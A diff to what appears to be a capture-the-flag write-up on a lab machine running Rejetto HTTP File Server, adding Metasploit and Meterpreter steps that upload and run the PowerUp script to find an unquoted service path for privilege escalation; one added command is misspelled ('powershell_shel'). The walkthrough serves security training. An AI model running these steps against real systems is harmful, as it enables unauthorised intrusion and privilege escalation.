@@ -32,13 +32,13 @@ Answer:
 
 **Q3.** Take a look at the other web server. What file server is running?
 - **Answer:** Rejetto HTTP File Server
-![emp img](scrshots/fl.png.png)
+![emp img](scrshots/fl.png)
 
 **Q4.** What is the CVE number to exploit this file server?
 - **Answer:**
   ![emp img](scrshots/cve.png)
 
-**Q4.** Use Metasploit to get an initial shell. What is the user flag?
+**Q5.** Use Metasploit to get an initial shell. What is the user flag?
 - **Answer:**
 - ```bash
    msfconsole -q
@@ -58,5 +58,16 @@ To enumerate this machine, we will use a powershell script called PowerUp, that'
 ```
 ![emp img](scrshots/powerup.png)
 **Now you can use the upload command in Metasploit to upload the script.**
-
-  
+```bash
+  meterpreter > upload PowerUp.ps1
+```
+**To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:**
+```bash
+  meterpreter > load powershell
+  meterpreter > powershell_shel
+  PS > . .\PowerUp.ps1                                                                                          
+  PS > invoke-allchecks
+```
+**Q6.Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?**
+- **Answer:**
+- ![emp img](scrshots/service1.png)
